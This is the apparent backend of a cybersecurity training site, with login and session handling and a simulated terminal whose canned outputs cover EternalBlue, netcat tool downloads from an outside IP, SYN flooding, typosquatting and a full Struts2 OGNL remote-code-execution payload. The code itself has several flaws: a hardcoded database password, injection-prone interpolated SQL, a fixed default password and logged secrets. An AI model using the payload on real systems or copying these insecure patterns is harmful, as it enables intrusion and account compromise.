// Import required libraries and modules
const express = require('express');
const { OAuth2Client } = require('google-auth-library');
const winston = require('winston');
const mysql = require('mysql2/promise');
const cors = require('cors');
const bcrypt = require('bcrypt');
const { stringify } = require('querystring');
const saltRounds = 10; // Adjust based on security requirements
const SESSION_LENGTH = 4;
process.env.TZ = 'UTC'; // UTC Time Zone
const DEBUG = true;
const hostname = 'cyber-cases.info'
const port = process.env.PORT || 3000;

// Create an Express app
const app = express();
const client = new OAuth2Client("398792302857-gj4s9331t22kljn6inunra5tblqlmmpe.apps.googleusercontent.com");

const pool = mysql.createPool({
    //host: 'cyber-cases.info',
    user: 'cybercase_admin',
    password: 'NS=+KLPN445^^IO#$HGTJ14567',
    database: 'cybercase_db',
    //port: 3306,
});

/*
// Database Logger Function
async function logToDatabase(logLevel, logMessage, additionalInfo = {})
{
    const logData = JSON.stringify({ level: logLevel, message: logMessage, ...additionalInfo });
    const logTime = new Date().toISOString().slice(0, 19).replace('T', ' '); // Format current time for MySQL

    try 
    {
        // Insert log entry without specifying log_id, as it's auto-incremented
        await pool.query('INSERT INTO Logs (log_time, log_data) VALUES (?, ?)', [logTime, logData]);
    } 
    catch (error)
    {
        console.error('Error logging to database:', error);
    }
}
*/

// Database Logger Function
async function logToDatabase(logLevel, logMessage)
{
    const logData = JSON.stringify({ level: logLevel, message: logMessage});
    const logTime = new Date().toISOString().slice(0, 19).replace('T', ' '); // Format current time for MySQL

    try 
    {
        // Insert log entry without specifying log_id, as it's auto-incremented
        await pool.query('INSERT INTO Logs (log_time, log_data) VALUES (?, ?)', [logTime, logData]);
    } 
    catch (error)
    {
        console.error('Error logging to database:', error);
    }
}

initializeDatabaseConnection = async () => {
    try 
    {
        // Connect to the Database CaseDB
        await pool.query(`USE cybercase_db;`);
        // Clear leftover Sessions from last spin-up to prevent conflicts
        await pool.query(`TRUNCATE Sessions;`);
        logToDatabase('info', 'Database connection successful.');
        if (DEBUG === true)
            console.log("Succesfully began database connection!");
    } 
    catch (error) 
    {
        // logToDatabase('error', `Error connecting to the database: ${error}`) // Why is this here? We can't connect to db if we reach here... so we can't log that we can't reach the db...
        console.error("Error whilst Initializing DB connection!\n")
        throw error;
    }
};



// Initialize the database and create the required table
initializeDatabaseConnection()
    .then(() => {
        // Start the server only after the database is initialized
        app.use(express.json());
        app.use(cors({ origin: 'https://cyber-cases.info:2083', credentials: true }));

        // VerifyToken endpoint
        app.post('/verifyToken', async (req, res) => {
            const token = req.body.token;
            logToDatabase('info', `Received token for verification: ${token}`);
            try {
                const ticket = await client.verifyIdToken({
                    idToken: token,
                    audience: "398792302857-gj4s9331t22kljn6inunra5tblqlmmpe.apps.googleusercontent.com",
                });
                const payload = ticket.getPayload();


                logToDatabase('info', `Token verified successfully. UserId: ${payload['email']}`);

                const userId = payload['email'];

                // Check if the user exists in the Users table

                const [userExists] = await pool.query(`CALL checkUserExists("${userId}")`);
                // console.log(userExists);
                if (userExists[0].length === 0) {
                    // User does not exist, create a new user
                    bcrypt.hash("P@ssw0rd", saltRounds, async (err, hashedPassword) => {
                        if (err) {
                            logToDatabase('error', `Error hashing password: ${err}`)
                            return res.status(500).json({ success: false, message: 'Error registering new user' });
                        }
                        try {
                            // Insert the new user with a parameterized query
                            await pool.query(`CALL registerUser("${userId}", "${hashedPassword}")`);
                            logToDatabase('info', `New user registered successfully: ${userId}`);

                        } catch (error) {
                            logToDatabase('error', `Error registering new user: ${error}`)
                            return res.status(500).json({ success: false, message: 'Error registering new user' });
                        }
                    });
                }

                // Create a new session
                // Procedure checks if there is a prexisting session that can be extended by SESSION_LENGTH amount of time
                const [result] = await pool.query(`SELECT startSession("${userId}", ${SESSION_LENGTH})`); // 4 Hours
                const sessionId = Object.values(result[0])[0];

                // DEBUGGING
                if (DEBUG === true) {
                    console.log(`Query returned: `);
                    console.log(`${result}`);
                    console.log(`sessionId: ${Object.values(result[0])[0]}`);
                }

                logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);

                // Include sessionId in the response JSON
                res.json({ verified: true, sessionId: sessionId });
            } catch (error) {
                logToDatabase('error', `Token verification failed: ${error}`);
                res.status(401).json({ verified: false, error: error.message });
            }
        });

        // VerifySession middleware
        const verifySession = async (req, res, next) => {
            const sessionId = req.headers['x-session-id'];
            if (!sessionId) {
                return res.status(401).json({ message: 'Session ID required' });
            }

            try {
                // Retrieve user ID associated with session ID from the database
                const userId = await getUserIdFromSessionId(sessionId);
                if (!userId) {
                    return res.status(401).json({ message: 'Invalid or expired session' });
                }

                next();
            } catch (error) {
                console.error('Error verifying session:', error);
                return res.status(500).json({ message: 'Internal server error' });
            }
        };

        app.get('/verifySession', verifySession, (req, res) => {
            res.json({ authenticated: true });
        });

        // Function to check password complexity
        function isPasswordComplex(password) {
            // Complexity requirements logic
            // Example: Password must be at least 8 characters long and contain at least one letter and one digit.
            const minLength = 8;
            const hasLetter = /[a-zA-Z]/.test(password);
            const hasDigit = /\d/.test(password);

            return password.length >= minLength && hasLetter && hasDigit;
        }

        // Non-Google Register Endpoint
        app.post('/register', async (req, res) => {
            const { username, password } = req.body;

            if (DEBUG === true)
                console.log(`Attempting to register user: ${username}`);

            /*  Is it neccessary to perform the same check twice? Pehaps create a sql injection test and do that instead?
            // Check password complexity using the same logic as client-side
            if (!isPasswordComplex(password)) {
                return res.status(400).json({ success: false, message: 'Password does not meet complexity requirements.' });
            }
            */
    
             const invalidUsernames = ["Admin", "Administrator", "Operator", "Root", "Moderator"]; // Do not want to give away information that an account with one of theese usernames exists. Responds with message "Invalid username" instead of username already exists inf username matches one of theese
    
            let invalidFlag = false; // Flag for if the username is invalid. If true, respond invalid username, else username already exists
            
            function checkForInvalid(invalidUsername)
            {
                if ((username === invalidUsername) || (username === invalidUsername.toLowerCase()) || (username === invalidUsername.toUpperCase()))
                {
                    invalidFlag = true;
                    // Should probaly add a way to prevent further iterations from checking but...
                }
            }
    
            try {
                
                /*
                // Check if username exists
                const [users] = await pool.query(`CALL checkUserExists("${username}")`);
                if (users.length <= 0) {
                    return res.status(409).json({ success: false, message: 'Username already exists' });
                }
                */
                
                 const [users] = await pool.query("SELECT * FROM Users WHERE userid=?", username);
                 if (users.length > 0) // Found an existing user with that username
                 {
                    if (DEBUG === true)
                        console.log("Query returned at least one user")
                    
                    invalidUsernames.forEach(checkForInvalid);
                    
                    if (invalidFlag) // If true, return invalid username
                        return res.status(408).json({ success: false, message: 'Invalid Username' });
                    else
                        return res.status(409).json({ success: false, message: 'Username already exists' });
                 }
                 
                
                invalidUsernames.forEach(checkForInvalid);
                
                if (invalidFlag) // If true, return invalid username
                    return res.status(408).json({ success: false, message: 'Invalid Username' });

                // Hash the password
                bcrypt.hash(password, saltRounds, async (err, hashedPassword) => {
                    if (err) {
                        logToDatabase('error', `Error hashing password: ${err}`)
                        return res.status(500).json({ success: false, message: 'Error registering new user' });
                    }

                    try {
                        // Insert the new user with a parameterized query
                        await pool.query(`CALL registerUser("${username}", "${hashedPassword}")`);
                        res.status(201).json({ success: true, message: 'User registered successfully' });
                    } catch (error) {
                        logToDatabase('error', `Error registering new user: ${error}`)
                        res.status(500).json({ success: false, message: 'Error registering new user' });
                    }
                });
            } catch (error) {
                logToDatabase('error', `Error checking username: ${error}`)
                res.status(500).json({ success: false, message: 'Error registering new user' });
            }
        });

        /*
        app.get(`/signin`, async (req, res) => {
            console.log('Attempting a get request on /signin\n')
            res.send({ TEST: "example text?"});
        });
        */

        // Non-Google Sign In Endpoint
        app.post('/signin', async (req, res) => {
            const { username, password } = req.body;

            if (DEBUG === true)
                console.log(`Attempting to sign in user: ${username}`);

            // WE SHOULD PROBABLY CHANGE THIS IN THIS FUTURE
            const [users] = await pool.query("SELECT * FROM Users WHERE userid=?", username);
            if (users.length <= 0) {
                if (DEBUG === true)
                    console.log("Query returned zero users")
                return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
            }
            
            const user = users[0];
            
            if (DEBUG === true)
            {
                console.log(`After the query for userid = ${username}, recieved:`);
                console.log(user);
            }
            const decodedPassword = decodeURIComponent(password);
            
            if (DEBUG === true)
            {
                console.log(`Decoded the recieved password as "${password}"`)
            }

            bcrypt.compare(decodedPassword, user.pass, async (err, result) => {
                if (err) {
                    logToDatabase('error', `Error during password comparison: ${err}`)
                    return res.status(500).json({ authenticated: false, message: 'Error during sign in' });
                }

                if (!result) {
                    logToDatabase('warn', `Authentication failed for user ${username}`)
                    return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
                }
                const [sessionResult] = await pool.query(`SELECT startSession("${username}", ${SESSION_LENGTH})`);
                const sessionId = Object.values(sessionResult[0]);

                logToDatabase('info', `User signed in successfully: ${username}`)
                logToDatabase('info', `Session created for user: ${username}, userId: ${user.id}, sessionId: ${sessionId}`)
                
                if (DEBUG === true)
                    console.log(`User succesfully authenticated! Sending user back with sessionId: ${sessionId}`);
                
                res.json({ authenticated: true, sessionId: sessionId });
            });
        });

        // Sign-out Endpoint
        app.post('/signout', async (req, res) => {
            const sessionId = req.headers['x-session-id'];
            if (!sessionId) {
                return res.status(401).json({ message: 'Session ID required for sign out' });
            }

            try {
                // Check if the session exists in the sessions table
                const [sessions] = await pool.query('SELECT * FROM Sessions WHERE sessionId = ?', [sessionId]);

                if (sessions.length === 0) {
                    // Session not found, return an error response
                    return res.status(401).json({ message: 'Invalid session ID' });
                }

                // Delete the session to sign the user out
                await pool.query('DELETE FROM Sessions WHERE sessionId = ?', [sessionId]);

                // Check if the session was associated with a Google account
                if (sessions[0].userId.startsWith('google:')) {
                    // Handle sign-out for Google users (you may need to implement Google sign-out logic here)
                    // For Google sign-out, you can revoke the access token or perform any necessary actions.
                    // Example:
                    // await revokeGoogleAccessToken(sessions[0].userId.substring(7)); // Remove 'google:' prefix
                    // Return a success response
                    return res.status(200).json({ message: 'Sign-out successful' });
                } else {
                    // Handle sign-out for local users (clear their session)
                    // Local users can be signed out by deleting the session from the sessions table.
                    // Return a success response
                    return res.status(200).json({ message: 'Sign-out successful' });
                }
            } catch (error) {
                // Handle errors
                console.error('Error during sign-out:', error);
                return res.status(500).json({ message: 'Error during sign-out' });
            }
        });

        // Execute Command endpoint
        app.post('/execute-command', async (req, res) => {
            const { command } = req.body; // Extract the command from the request body

            const commandResponses = {
                'date': () => `Current Date and Time: ${new Date().toString()}\r\n`,
                'nmap -p 139,445 192.168.1.0/24': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.103\nHost is up (0.011s latency).\nPORT    STATE    SERVICE\n139/tcp open     netbios-ssn\n445/tcp open     microsoft-ds\r\n`,
                'msfconsole': () => `Launching msfconsole....\r\n`,
                'use auxiliary/scanner/smb/smb_ms17_010': () => `msf auxiliary(scanner/smb/smb_ms17_010)>\r\n`,
                'set RHOST 192.168.1.103': () => `RHOSTS => 192.168.1.103\r\n`,
                'run': () => `[+] 192.168.1.103:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 x64 (64-bit)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution complete\r\n`,
                'use exploit/windows/smb/ms17_010_eternalblue': () => `msf exploit(windows/smb/ms17_010_eternalblue)>\r\n`,
                'set payload generic/shell_reverse_tcp': () => `payload => generic/shell_reverse_tcp\r\n`,
                'exploit': () => `Exploiting 192.168.1.103....\n....\nExploited....\nFLAG: u46U0o\r\n`,
                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,

                'ssh 192.168.1.47': () => `Username: faziodavid\r\nPassword: 1aB3cD7e\r\nLast login: Thu Jan 25 16:43:27 2024 from 192.168.1.47\nfaziodavid@Ubuntu:$`,
                'su - bmcadmin': () => `Switched to BMC default user successfully.`,
                'nc 74.233.19.204 12345 > nmap.tar.gz': () => `Downloaded nmap tool successfully.`,
                'nc 74.233.19.204 12345 > metasploit.tar.gz': () => `Downloaded Metasploit tool successfully.`,
                'tar -xzf nmap.tar.gz': () => `Unzipped nmap tool successfully.`,
                'tar -xzf metasploit.tar.gz': () => `Unzipped Metasploit tool successfully.`,
                'nmap 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nHost is up (0.012s latency).\nPORT STATE SERVICE\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n623/tcp open ipmi\n`,
                'nmap -sV -p 135 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nPORT STATE SERVICE VERSION\n135/tcp open msrpc Microsoft Windows RPC\n(unauthenticated) 5.1 (Windows 10)\n\nFLAG: HivRzt`,
                'help-module2': () => `Available Module 2 Commands:\n- ssh 192.168.1.47\n- su - bmcadmin\n- nc 74.233.19.204 12345 > nmap.tar.gz\n- nc 74.233.19.204 12345 > metasploit.tar.gz\n- tar -xzf nmap.tar.gz\n- tar -xzf metasploit.tar.gz\n- nmap 192.168.1.47\n- nmap -sV -p 135 192.168.1.47\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,

                'ping 192.168.168.1.28 -c 10': () => `PING 192.168.1.22 (192.168.1.22) 56(84) bytes of data.\n64 bytes from 192.168.1.22: icmp_seq=1 ttl=63 time=0.861 ms\n64 bytes from 192.168.1.22: icmp_seq=2 ttl=63 time=0.942 ms\n64 bytes from 192.168.1.22: icmp_seq=3 ttl=63 time=3.30 ms\n64 bytes from 192.168.1.22: icmp_seq=4 ttl=63 time=2.09 ms\n64 bytes from 192.168.1.22: icmp_seq=5 ttl=63 time=1.92 ms\n--- 192.168.1.1 ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 4051ms\nrtt min/avg/max/mdev = 0.861/1.821/3.299/0.889 ms\n`,
                'hping3 -S 192.168.1.28 -p 80 -c 1': () => `HPING 192.168.1.28 (eth0 192.168.1.28): S set, 40 headers + 0 data bytes\nlen=46 ip=72.14.207.99 ttl=244 id=64932 sport=80 flags=SA seq=0\nwin=8190 rtt=266.4 ms\nUnset\nUnset\n--- 72.14.207.99 hping statistic ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 266.4/266.4/266.4 ms\n`,
                'hping3 -S 192.168.1.28 –flood -p 80': () => `HPING 4.2.2.1 (eth1 4.2.2.1): S set, 40 headers + 0 data bytes\nhping in flood mode, no replies will be shown\n`,
                'ping 192.168.168.1.28 -c 10': () => `PING 192.168.1.22 (192.168.1.22) 56(84) bytes of data.\n10 packets transmitted, 0 received, +4 errors, 100% packet loss, time 9333ms\n`,
                'help-module3': () => `Available Module 3 Commands:\n- ping 192.168.168.1.28 -c 10\n- hping3 -S 192.168.1.28 -p 80 -c 1\n- hping3 -S 192.168.1.28 –flood -p 80\n- ping 192.168.168.1.28 -c 10\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,

                'nc 192.168.1.100 63329 < sunburst.cs': () => `Downloading and executing Sunburst malware...`,
                'help-module4': () => `Available Module 4 Commands:\n- nc 192.168.1.100 63329 < sunburst.cs\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,

                'urlcrazy twitter.com': () => `
URLCrazy Domain Report
Domain    : twitter.com
Keyboard  : qwerty
At        : 2024-03-20 15:32:54 -0400
# Please wait. 2046 hostnames to process

Typo Type              Typo Domain                       IP               Country 
--------------------------------------------------------------------------------------------
Original               twitter.com                       104.244.42.1     UNITED STATES (US)  
Character Omission     titter.com                        104.21.44.196    UNITED STATES (US)  
Character Omission     twiter.com                        199.59.148.10    UNITED STATES (US)   
Character Omission     twitte.com                        173.236.211.166  UNITED STATES (US)         
Character Omission     twitter.cm                        104.247.81.54    CANADA (CA)                 
Character Omission     twitter.co                        3.64.163.50      UNITED STATES (US)    
Character Omission     twittr.com                                                         
Character Omission     twtter.com                                                         
Character Repeat       ttwitter.com                      95.211.117.215   NETHERLANDS (NL)    
Character Repeat       twiitter.com                                                    
Character Repeat       twitteer.com                      103.224.182.241  AUSTRALIA (AU) 
Character Repeat       twitterr.com                      103.224.182.239  AUSTRALIA (AU) 
Character Repeat       twittter.com                      199.59.150.39    UNITED STATES (US) 
Character Repeat       twwitter.com                      199.59.243.225   UNITED STATES (US) 
Character Swap         tiwtter.com                                                                       
Character Swap         twitetr.com                       192.198.80.150   UNITED STATES (US) 
Character Swap         twittre.com                       69.162.80.59     UNITED STATES (US)
Character Swap         twtiter.com                       192.198.80.147   UNITED STATES (US)
Character Swap         wtitter.com                       69.162.80.56     UNITED STATES (US)
Character Replacement  rwitter.com                       104.247.82.50    CANADA (CA)
Character Replacement  teitter.com                       103.224.182.241  AUSTRALIA (AU) 
Character Replacement  tqitter.com                       199.59.243.225   UNITED STATES (US)
Character Replacement  twirter.com                       15.197.142.173   UNITED STATES (US) 
Character Replacement  twitrer.com                       172.67.150.7     UNITED STATES (US)  
Character Replacement  twittee.com                       193.243.189.83   GERMANY (DE) 
Character Replacement  twittet.com                       95.211.219.66    NETHERLANDS (NL) 
Character Replacement  twittrr.com                                                          
Character Replacement  twittwr.com                       47.254.33.193    UNITED STATES (US)
Character Replacement  twityer.com                       3.33.130.190     UNITED STATES (US)
Character Replacement  twiyter.com                       172.98.192.37    UNITED STATES (US)
Character Replacement  twotter.com                       5.61.57.250      UNITED KINGDOM (GB)
Character Replacement  twutter.com                       103.224.182.246  AUSTRALIA (AU) 
Double Replacement     twirrer.com                       199.59.243.225   UNITED STATES (US)
Double Replacement     twiyyer.com                       199.59.243.225   UNITED STATES (US)
Character Insertion    trwitter.com                      162.210.196.171  UNITED STATES (US)
Character Insertion    tweitter.com                      69.162.80.62     UNITED STATES (US)
Character Insertion    twiotter.com                      104.247.82.50    CANADA (CA)\r\n`,
            'urlcrazy google.com': () => `
URLCrazy Domain Report
Domain    : google.com
Keyboard  : qwerty
At        : 2024-03-20 15:38:52 -0400
# Please wait. 2025 hostnames to process

Typo Type              Typo Domain                      IP               Country        
-------------------------------------------------------------------------------------------
Original               google.com                       142.250.191.174  UNITED STATES (US) 
Character Omission     gogle.com                        142.251.32.4     UNITED STATES (US)
Character Omission     googe.com                        162.243.10.151   UNITED STATES (US) 
Character Omission     googl.com                        172.217.0.164    UNITED STATES (US) 
Character Omission     google.cm                        172.217.1.99     UNITED STATES (US) 
Character Omission     google.co                        142.250.190.46   UNITED STATES (US)  
Character Omission     goole.com                        217.160.0.201    GERMANY (DE)       
Character Repeat       ggoogle.com                      142.250.191.228  UNITED STATES (US) 
Character Repeat       googgle.com                                                          
Character Repeat       googlee.com                      172.217.4.36     UNITED STATES (US) 
Character Repeat       googlle.com                      104.21.83.75     UNITED STATES (US)
Character Repeat       gooogle.com                      142.251.32.4     UNITED STATES (US)
Character Swap         gogole.com                       172.217.5.4      UNITED STATES (US)
Character Swap         googel.com                       142.250.191.164  UNITED STATES (US) 
Character Swap         goolge.com                       142.250.190.100  UNITED STATES (US) 
Character Swap         ogogle.com                       142.250.191.228  UNITED STATES (US) 
Character Replacement  foogle.com                       64.111.126.107   UNITED STATES (US) 
Character Replacement  giogle.com                                                          
Character Replacement  goigle.com                                                           
Character Replacement  goofle.com                       37.48.65.136     NETHERLANDS (NL)    
Character Replacement  googke.com                                                            
Character Replacement  googlr.com                       142.250.191.228  UNITED STATES (US)
Character Replacement  googlw.com                                                            
Character Replacement  goohle.com                       47.254.33.193    UNITED STATES (US) 
Character Replacement  gopgle.com                                                           
Character Replacement  gpogle.com                       74.63.241.30     UNITED STATES (US) 
Character Replacement  hoogle.com                       15.197.142.173   UNITED STATES (US) 
Double Replacement     giigle.com                       78.41.204.36     NETHERLANDS (NL)   
Double Replacement     gppgle.com                       142.250.191.100  UNITED STATES (US)  
Character Insertion    gfoogle.com                                                          
Character Insertion    ghoogle.com                                                          
Character Insertion    goiogle.com                                                          
Character Insertion    googfle.com                      104.247.81.53    CANADA (CA)         
Character Insertion    googhle.com                                                         
Character Insertion    googler.com                                                          
Character Insertion    googlew.com                      107.161.23.204   UNITED STATES (US)
Character Insertion    googlke.com                      107.161.23.204   UNITED STATES (US)
Character Insertion    gooigle.com                                                          
Character Insertion    goopgle.com                      69.162.80.53     UNITED STATES (US)
Character Insertion    gopogle.com                      107.161.23.204   UNITED STATES (US)
Missing Dot            googlecom.com                    172.217.4.68     UNITED STATES (US)
Missing Dot            wwwgoogle.com                    142.250.190.4    UNITED STATES (US)
Insert Dash            g-oogle.com                                                          
Insert Dash            go-ogle.com                      66.96.149.22     UNITED STATES (US)
Insert Dash            goo-gle.com                                                          
Insert Dash            goog-le.com                      74.208.236.69    UNITED STATES (US)
Insert Dash            googl-e.com
Insert Dash            google-.com
Singular or Pluralise  googles.com
Vowel Swap             gaagle.cam                       162.255.119.247  UNITED STATES (US)\r\n`,
            'help-module5': () => `Available Module 5 Commands:\n- urlcrazy twitter.com\n- urlcrazy google.com\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,

            'curl --location --request GET https://192.168.1.58:8443/struts2-showcase/showcase.action -k -I': () => `HTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nSet-Cookie: JSESSIONID=1CF20D909CC5609C1CE7218FBD9B809F;\nPath=/struts2-showcase; Secure; HttpOnly\nContent-Type: text/html;charset=ISO-8859-1\nTransfer-Encoding: chunked\nDate: X\r\n`,
            'cat exploit.txt': () => `curl --location --request GET 'https://192.168.1.58:8443/struts2-showcase/showcase.action' --header 'Content-Type: %{(#_='\''multipart/form-data'\'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER _ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['\'' com.opensymphony.xwork2.ActionContext.container'\'']).(#ognlUtil=#contai ner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUti l.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().cle ar()).(#context.setMemberAccess(#dm)))).(#cmd='\''pwd'\'').(#iswin=(@jav a.lang.System@getProperty('\''os.name'\'').toLowerCase().contains('\''wi n'\''))).(#cmds=(#iswin?{'\''cmd.exe'\'','\''/c'\'',#cmd}:{'\''/bin/bash '\'','\''-c'\'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#proces s=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getRespons e().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.ge tInputStream(),#ros)).(#ros.flush())}' -k\r\n`,
            './runexploit.sh pwd': () => `/usr/local/tomcat\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
            './runexploit.sh ls': () => `BUILDING.txt\nCONTRIBUTING.md\nLICENSE\nNOTICE\nREADME.md\nRELEASE-NOTES\nRUNNING.txt\nbin\nconf\ninclude\nlib\nlogs\nnative-jni-lib\ntemp\nwebapps\nwork\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
            './runexploit.sh whoami': () => `root\ncurl: (18) transfer closed with outstanding read data remaining\r\n`,
            'help-module6': () => `Available Module 6 Commands:\n- curl --location --request GET https://192.168.1.58:8443/struts2-showcase/showcase.action -k -I\n- cat exploit.txt\n- ./runexploit.sh pwd\n- ./runexploit.sh ls\n- ./runexploit.sh whoami\r\n`
            };

            if (command in commandResponses) {
                const response = commandResponses[command];
                // If the command response is a function, execute it to get the response
                const result = typeof response === 'function' ? response() : response;
                res.send(result);
            } else {
                res.send(`Command not recognized: ${command}\r\n`);
            }
        });


        app.listen(port, () => {
            console.log(`Server running at https://${hostname}:${port}`);
        });

        // Client-Logs Endpoint
        app.post('/client-logs', express.json(), async (req, res) => {
            const { message, level } = req.body;

            await logToDatabase(level, message);

            res.status(204).end();  // No content to send back
        })

        /**
         * Retrieve the user ID associated with a given session ID from the database.
         * This function queries the database to find the user ID linked to the provided session ID.
         * @param {string} sessionId - The unique session identifier.
         * @returns {string|null} The user ID if found, or null if not found.
         */
        async function getUserIdFromSessionId(sessionId) {
            try {
                // Query the database to retrieve the user ID associated with the session ID
                const [sessions] = await pool.query('SELECT userId FROM Sessions WHERE sessionId = ? AND expiresAt > NOW()', [sessionId]);

                // DEBUG
                if(DEBUG === true)
                    console.log(sessions);
                // Check if a session with the provided session ID exists
                if (sessions.length > 0) {
                    // Return the user ID associated with the session
                    return sessions[0].userId;
                } else {
                    // Session not found or expired, return null
                    return null;
                }
            } catch (error) {
                // Log any errors that occur during the database query
                console.error('Error retrieving user ID from session ID:', error);
                throw error; // Rethrow the error to handle it at a higher level
            }
        }

    })
    .catch((error) => {
        // Handle initialization errors here
        console.error('Failed to initialize the database:', error);
    });
